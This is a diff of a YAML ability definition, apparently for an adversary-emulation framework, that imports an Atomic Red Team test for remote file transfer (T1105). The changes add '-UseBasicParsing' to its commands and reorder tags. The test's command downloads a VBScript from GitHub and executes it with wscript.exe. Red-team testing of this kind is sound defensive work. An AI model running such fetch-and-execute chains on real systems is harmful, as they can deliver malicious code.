@@ -12,8 +12,8 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1105\src\T1105-download-file.vbs") -ErrorAction ignore
           | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs"
-          -OutFile "PathToAtomicsFolder\T1105\src\T1105-download-file.vbs"; fi; wscript.exe
-          "PathToAtomicsFolder\T1105\src\T1105-download-file.vbs"'
+          -OutFile "PathToAtomicsFolder\T1105\src\T1105-download-file.vbs" -UseBasicParsing;
+          fi; wscript.exe "PathToAtomicsFolder\T1105\src\T1105-download-file.vbs"'
         cleanup: del Atomic-License.txt >nul 2>&1
   plugin: atomic
   singleton: false
@@ -22,8 +22,8 @@
   privilege: ''
   buckets:
   - t1105
-  - command-and-control
   - atomic-red-team
+  - command-and-control
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -42,9 +42,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs"
-        -OutFile "#{vbscript_file}"
+        -OutFile "#{vbscript_file}" -UseBasicParsing
 
         '
     technique_created: '2017-05-31T21:31:16.408Z'
     atomic_guid: 97116a3f-efac-4b26-8336-b9cb18c45188
-    import_timestamp: '2026-10-20T07:08:29.255946Z'
+    import_timestamp: '2026-10-21T07:01:51.342558Z'
